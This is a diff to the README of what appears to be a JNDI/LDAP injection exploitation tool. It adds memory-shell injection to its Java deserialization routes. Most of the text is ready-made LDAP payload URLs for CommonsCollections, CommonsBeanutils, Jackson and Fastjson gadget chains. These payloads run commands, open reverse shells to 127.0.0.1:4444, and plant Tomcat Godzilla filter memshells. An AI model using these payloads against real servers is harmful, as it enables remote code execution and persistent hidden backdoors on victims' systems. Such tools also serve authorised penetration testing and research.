@@ -104,7 +104,7 @@ ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 
 Based on the [MemShellParty](https://github.com/ReaJason/MemShellParty) project
 
-Currently only supports injecting memShells through Basic/BeanFactory routes
+Currently only supports injecting memShells through Basic/BeanFactory/Deserialize routes
 
 ```bash
 # Format
@@ -469,9 +469,10 @@ ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
 ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # the path is relative to the current directory
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
 
-# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and reverse shell
+# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution, reverse shell and memshell injection
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/MemShell/Tomcat/Godzilla/Filter
 
 # CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator
@@ -483,31 +484,36 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculato
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
 # CommonsBeanutils deserialization
-# No need for commons-collections dependency, use TemplatesImpl, support command execution and reverse shell
+# No need for commons-collections dependency, use TemplatesImpl, support command execution, reverse shell and memshell injection
 # According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4
 
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/MemShell/Tomcat/Godzilla/Filter
 
 # 1.9.4
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/Filter
 
 # Jackson deserialization
 # Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson deserialization
 
 # Fastjson1: all versions (1.2.x)
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson2: <= 2.0.26
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
 ```
 
 ## Script
